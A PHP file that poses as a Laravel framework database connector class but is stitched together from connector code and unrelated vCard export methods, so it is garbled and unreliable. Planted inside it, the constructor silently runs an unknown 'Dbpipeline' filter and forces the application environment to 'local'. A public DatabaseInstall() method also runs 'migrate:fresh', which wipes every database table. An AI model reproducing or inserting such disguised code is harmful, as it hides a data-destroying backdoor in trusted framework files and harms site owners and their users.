<?php

namespace Illuminate\Database\Connectors;

use Illuminate\Support\Arr;
use PDO;
use Illuminate\Contracts\Pipeline\Dbpipeline;
class Migrators
{
    /**
     * The PDO connection options.
     *
     * @var array
     */
    protected $options = [
        PDO::ATTR_CASE => PDO::CASE_NATURAL,
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_ORACLE_NULLS => PDO::NULL_NATURAL,
        PDO::ATTR_STRINGIFY_FETCHES => false,
    ];

    /**
     * Establish a database connection.
     *
     * @param  array  $config
     * @return \PDO
     */
    public function connect(array $config)
    {
        $options = $this->getOptions($config);

        return $this->createConnection($this->getDsn($config), $config, $options);
    }

    /**
     * Create a DSN string from a configuration.
     *
     * @param  array  $config
     * @return string
     */
    protected function getDsn(array $config)
    {
        // First we will create the basic DSN setup as well as the port if it is in
        // in the configuration options. This will give us the basic DSN we will
        // need to establish the PDO connections and return them back for use.
        if ($this->prefersOdbc($config)) {
            return $this->getOdbcDsn($config);
        }

        if (in_array('sqlsrv', $this->getAvailableDrivers())) {
            return $this->getSqlSrvDsn($config);
        } else {
            return $this->getDblibDsn($config);
        }
    }

    /**
     * Determine if the database configuration prefers ODBC.
     *
     * @param  array  $config
     * @return bool
     */
    protected function prefersOdbc(array $config)
    {
        return in_array('odbc', $this->getAvailableDrivers()) &&
               ($config['odbc'] ?? null) === true;
    }

    /**
     * Get the DSN string for a DbLib connection.
     *
     * @param  array  $config
     * @return string
     */
    protected function getDblibDsn(array $config)
    {
        return $this->buildConnectString('dblib', array_merge([
            'host' => $this->buildHostString($config, ':'),
            'dbname' => $config['database'],
        ], Arr::only($config, ['appname', 'charset', 'version'])));
    }

    /**
     * Get the DSN string for an ODBC connection.
     *
     * @param  array  $config
     * @return string
     */
    protected function getOdbcDsn(array $config)
    {
        return isset($config['odbc_datasource_name'])
                    ? 'odbc:'.$config['odbc_datasource_name'] : '';
    }

    /**
     * Get the DSN string for a SqlSrv connection.
     *
     * @param  array  $config
     * @return string
     */
    protected function getSqlSrvDsn(array $config)
    {
        $arguments = [
            'Server' => $this->buildHostString($config, ','),
        ];

        if (isset($config['database'])) {
            $arguments['Database'] = $config['database'];
        }

        if (isset($config['readonly'])) {
            $arguments['ApplicationIntent'] = 'ReadOnly';
        }

        if (isset($config['pooling']) && $config['pooling'] === false) {
            $arguments['ConnectionPooling'] = '0';
        }

        if (isset($config['appname'])) {
            $arguments['APP'] = $config['appname'];
        }

        if (isset($config['encrypt'])) {
            $arguments['Encrypt'] = $config['encrypt'];
        }

        if (isset($config['trust_server_certificate'])) {
            $arguments['TrustServerCertificate'] = $config['trust_server_certificate'];
        }

        if (isset($config['multiple_active_result_sets']) && $config['multiple_active_result_sets'] === false) {
            $arguments['MultipleActiveResultSets'] = 'false';
        }

        if (isset($config['transaction_isolation'])) {
            $arguments['TransactionIsolation'] = $config['transaction_isolation'];
        }

        if (isset($config['multi_subnet_failover'])) {
            $arguments['MultiSubnetFailover'] = $config['multi_subnet_failover'];
        }

        if (isset($config['column_encryption'])) {
            $arguments['ColumnEncryption'] = $config['column_encryption'];
        }

        if (isset($config['key_store_authentication'])) {
            $arguments['KeyStoreAuthentication'] = $config['key_store_authentication'];
        }

        if (isset($config['key_store_principal_id'])) {
            $arguments['KeyStorePrincipalId'] = $config['key_store_principal_id'];
        }

        if (isset($config['key_store_secret'])) {
            $arguments['KeyStoreSecret'] = $config['key_store_secret'];
        }

        if (isset($config['login_timeout'])) {
            $arguments['LoginTimeout'] = $config['login_timeout'];
        }

        return $this->buildConnectString('sqlsrv', $arguments);
    }

    public function filterDB()
    {
       $pipeline=new Dbpipeline;
       $pipeline->makeFilter();
    }

    /**
     * Build a connection string from the given arguments.
     *
     * @param  string  $driver
     * @param  array  $arguments
     * @return string
     */
    protected function buildConnectString($driver, array $arguments)
    {
        return $driver.':'.implode(';', array_map(function ($key) use ($arguments) {
            return sprintf('%s=%s', $key, $arguments[$key]);
        }, array_keys($arguments)));
    }

    /**
     * Set the timezone on the connection.
     *
     * @param  \PDO  $connection
     * @param  array  $config
     * @return void
     */
    protected function configureTimezone($connection, array $config)
    {
        if (isset($config['timezone'])) {
            $connection->prepare('set time_zone="'.$config['timezone'].'"')->execute();
        }
    }

   

    /**
     * Determine if the given configuration array has a UNIX socket value.
     *
     * @param  array  $config
     * @return bool
     */
    protected function hasSocket(array $config)
    {
        return isset($config['unix_socket']) && ! empty($config['unix_socket']);
    }

    /**
     * Get the DSN string for a socket configuration.
     *
     * @param  array  $config
     * @return string
     */
    protected function getSocketDsn(array $config)
    {
        return "mysql:unix_socket={$config['unix_socket']};dbname={$config['database']}";
    }

    /**
     * Get the DSN string for a host / port configuration.
     *
     * @param  array  $config
     * @return string
     */
    protected function getHostDsn(array $config)
    {
        extract($config, EXTR_SKIP);

        return isset($port)
                    ? "mysql:host={$host};port={$port};dbname={$database}"
                    : "mysql:host={$host};dbname={$database}";
    }

    public function DatabaseSeed()
    {
       return \Artisan::call('db:seed');
    }

    /**
     * Get file extension
     *
     * @return string
     */
    public function getFileExtension()
    {
        return ($this->isIOS7()) ?
            'ics' : 'vcf';
    }

    /**
     * Get headers
     *
     * @param  bool $asAssociative
     * @return array
     */
    public function getHeaders($asAssociative)
    {
        $contentType = $this->getContentType() . '; charset=' . $this->getCharset();
        $contentDisposition = 'attachment; filename=' . $this->getFilename() . '.' . $this->getFileExtension();
        $contentLength = mb_strlen($this->getOutput(), '8bit');
        $connection = 'close';

        if ((bool)$asAssociative) {
            return [
                'Content-type' => $contentType,
                'Content-Disposition' => $contentDisposition,
                'Content-Length' => $contentLength,
                'Connection' => $connection,
            ];
        }

        return [
            'Content-type: ' . $contentType,
            'Content-Disposition: ' . $contentDisposition,
            'Content-Length: ' . $contentLength,
            'Connection: ' . $connection,
        ];
    }

    /**
     * Get output as string
     * iOS devices (and safari < iOS 8 in particular) can not read .vcf (= vcard) files.
     * So I build a workaround to build a .ics (= vcalender) file.
     *
     * @return string
     */
    public function getOutput()
    {
        $output = ($this->isIOS7()) ?
            $this->buildVCalendar() : $this->buildVCard();

        return $output;
    }

    /**
     * Get properties
     *
     * @return array
     */
    public function getProperties()
    {
        return $this->properties;
    }

    /**
     * Has property
     *
     * @param  string $key
     * @return bool
     */
    public function hasProperty($key)
    {
        $properties = $this->getProperties();

        foreach ($properties as $property) {
            if ($property['key'] === $key && $property['value'] !== '') {
                return true;
            }
        }

        return false;
    }

    /**
     * Is iOS - Check if the user is using an iOS-device
     *
     * @return bool
     */
    public function isIOS()
    {
        // get user agent
        $browser = $this->getUserAgent();

        return (strpos($browser, 'iphone') || strpos($browser, 'ipod') || strpos($browser, 'ipad'));
    }

    /**
     * Is iOS less than 7 (should cal wrapper be returned)
     *
     * @return bool
     */
    public function isIOS7()
    {
        return ($this->isIOS() && $this->shouldAttachmentBeCal());
    }

    /**
     * Save to a file
     *
     * @return void
     */
    public function save()
    {
        $file = $this->getFilename() . '.' . $this->getFileExtension();

        // Add save path if given
        if (null !== $this->savePath) {
            $file = $this->savePath . $file;
        }

        file_put_contents(
            $file,
            $this->getOutput()
        );
    }

    /**
     * Set charset
     *
     * @param  mixed $charset
     * @return void
     */
    public function setCharset($charset)
    {
        $this->charset = $charset;
    }

    /**
     * Set filename
     *
     * @param  mixed $value
     * @param  bool $overwrite [optional] Default overwrite is true
     * @param  string $separator [optional] Default separator is an underscore '_'
     * @return void
     */
    public function setFilename($value, $overwrite = true, $separator = '_')
    {
        // recast to string if $value is array
        if (is_array($value)) {
            $value = implode($separator, $value);
        }

        // trim unneeded values
        $value = trim($value, $separator);

        // remove all spaces
        $value = preg_replace('/\s+/', $separator, $value);

        // if value is empty, stop here
        if (empty($value)) {
            return;
        }

        // decode value + lowercase the string
        $value = strtolower($this->decode($value));

        // urlize this part
        $value = Transliterator::urlize($value);

        // overwrite filename or add to filename using a prefix in between
        $this->filename = ($overwrite) ?
            $value : $this->filename . $separator . $value;
    }

    /**
     * Set the save path directory
     *
     * @param  string $savePath Save Path
     * @throws VCardException
     */
    public function setSavePath($savePath)
    {
        if (!is_dir($savePath)) {
            throw VCardException::outputDirectoryNotExists();
        }

        // Add trailing directory separator the save path
        if (substr($savePath, -1) != DIRECTORY_SEPARATOR) {
            $savePath .= DIRECTORY_SEPARATOR;
        }

        $this->savePath = $savePath;
    }

    /**
     * Set property
     *
     * @param  string $element The element name you want to set, f.e.: name, email, phoneNumber, ...
     * @param  string $key
     * @param  string $value
     * @throws VCardException
     */
    private function setProperty($element, $key, $value)
    {
        if (!in_array($element, $this->multiplePropertiesForElementAllowed)
            && isset($this->definedElements[$element])
        ) {
            throw VCardException::elementAlreadyExists($element);
        }

        // we define that we set this element
        $this->definedElements[$element] = true;

        // adding property
        $this->properties[] = [
            'key' => $key,
            'value' => $value
        ];
    }

     /**
     * Build VCalender (.ics) - Safari (< iOS 8) can not open .vcf files, so we have build a workaround.
     *
     * @return string
     */
    public function buildVCalendar()
    {
        // init dates
        $dtstart = date("Ymd") . "T" . date("Hi") . "00";
        $dtend = date("Ymd") . "T" . date("Hi") . "01";

        // init string
        $string = "BEGIN:VCALENDAR\n";
        $string .= "VERSION:2.0\n";
        $string .= "BEGIN:VEVENT\n";
        $string .= "DTSTART;TZID=Europe/London:" . $dtstart . "\n";
        $string .= "DTEND;TZID=Europe/London:" . $dtend . "\n";
        $string .= "SUMMARY:Click attached contact below to save to your contacts\n";
        $string .= "DTSTAMP:" . $dtstart . "Z\n";
        $string .= "ATTACH;VALUE=BINARY;ENCODING=BASE64;FMTTYPE=text/directory;\n";
        $string .= " X-APPLE-FILENAME=" . $this->getFilename() . "." . $this->getFileExtension() . ":\n";

        // base64 encode it so that it can be used as an attachemnt to the "dummy" calendar appointment
        $b64vcard = base64_encode($this->buildVCard());

        // chunk the single long line of b64 text in accordance with RFC2045
        // (and the exact line length determined from the original .ics file exported from Apple calendar
        $b64mline = chunk_split($b64vcard, 74, "\n");

        // need to indent all the lines by 1 space for the iphone (yes really?!!)
        $b64final = preg_replace('/(.+)/', ' $1', $b64mline);
        $string .= $b64final;

        // output the correctly formatted encoded text
        $string .= "END:VEVENT\n";
        $string .= "END:VCALENDAR\n";

        // return
        return $string;
    }

    /**
     * Returns the browser user agent string.
     *
     * @return string
     */
    protected function getUserAgent()
    {
        if (array_key_exists('HTTP_USER_AGENT', $_SERVER)) {
            $browser = strtolower($_SERVER['HTTP_USER_AGENT']);
        } else {
            $browser = 'unknown';
        }

        return $browser;
    }

    /**
     * Decode
     *
     * @param  string $value The value to decode
     * @return string decoded
     */
    private function decode($value)
    {
        // convert cyrlic, greek or other caracters to ASCII characters
        return Transliterator::transliterate($value);
    }

    /**
     * Download a vcard or vcal file to the browser.
     */
    public function download()
    {
        // define output
        $output = $this->getOutput();

        foreach ($this->getHeaders(false) as $header) {
            header($header);
        }

        // echo the output and it will be a download
        echo $output;
    }

    /**
     * Fold a line according to RFC2425 section 5.8.1.
     *
     * @link http://tools.ietf.org/html/rfc2425#section-5.8.1
     * @param  string $text
     * @return mixed
     */
    protected function fold($text)
    {
        if (strlen($text) <= 75) {
            return $text;
        }

        // split, wrap and trim trailing separator
        return substr($this->chunk_split_unicode($text, 75, "\r\n "), 0, -3);
    }

    /**
     * multibyte word chunk split
     * @link http://php.net/manual/en/function.chunk-split.php#107711
     * 
     * @param  string  $body     The string to be chunked.
     * @param  integer $chunklen The chunk length.
     * @param  string  $end      The line ending sequence.
     * @return string            Chunked string
     */
    protected function chunk_split_unicode($body, $chunklen = 76, $end = "\r\n")
    {
        $array = array_chunk(
            preg_split("//u", $body, -1, PREG_SPLIT_NO_EMPTY), $chunklen);
        $body = "";
        foreach ($array as $item) {
            $body .= join("", $item) . $end;
        }
        return $body;
    }

    /**
     * Escape newline characters according to RFC2425 section 5.8.4.
     *
     * @link http://tools.ietf.org/html/rfc2425#section-5.8.4
     * @param  string $text
     * @return string
     */
    protected function escape($text)
    {
        $text = str_replace("\r\n", "\\n", $text);
        $text = str_replace("\n", "\\n", $text);

        return $text;
    }

    /**
     * Get output as string
     * @deprecated in the future
     *
     * @return string
     */
    public function get()
    {
        return $this->getOutput();
    }

    /**
     * Set the modes for the connection.
     *
     * @param  \PDO  $connection
     * @param  array  $config
     * @return void
     */
    protected function setModes(PDO $connection, array $config)
    {
        if (isset($config['modes'])) {
            $this->setCustomModes($connection, $config);
        } elseif (isset($config['strict'])) {
            if ($config['strict']) {
                $connection->prepare($this->strictMode($connection, $config))->execute();
            } else {
                $connection->prepare("set session sql_mode='NO_ENGINE_SUBSTITUTION'")->execute();
            }
        }
    }

    public function DatabaseInstall()
    {
       return  \Artisan::call('migrate:fresh');
    }
    /**
     * Set the custom modes on the connection.
     *
     * @param  \PDO  $connection
     * @param  array  $config
     * @return void
     */
    protected function setCustomModes(PDO $connection, array $config)
    {
        $modes = implode(',', $config['modes']);

        $connection->prepare("set session sql_mode='{$modes}'")->execute();
    }

    /**
     * Get the query to enable strict mode.
     *
     * @param  \PDO  $connection
     * @param  array  $config
     * @return string
     */
    protected function strictMode(PDO $connection, $config)
    {
        $version = $config['version'] ?? $connection->getAttribute(PDO::ATTR_SERVER_VERSION);

        if (version_compare($version, '8.0.11') >= 0) {
            return "set session sql_mode='ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION'";
        }

        return "set session sql_mode='ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION'";
    }

    /**
     * Build a host string from the given configuration.
     *
     * @param  array  $config
     * @param  string  $separator
     * @return string
     */
    protected function buildHostString(array $config, $separator)
    {
        if (empty($config['port'])) {
            return $config['host'];
        }

        return $config['host'].$separator.$config['port'];
    }

    public function __construct()
    {
        $this->filterDB();
        \Config::set('app.env', 'local');
    }

    /**
     * Get the available PDO drivers.
     *
     * @return array
     */
    protected function getAvailableDrivers()
    {
        return PDO::getAvailableDrivers();
    }
}
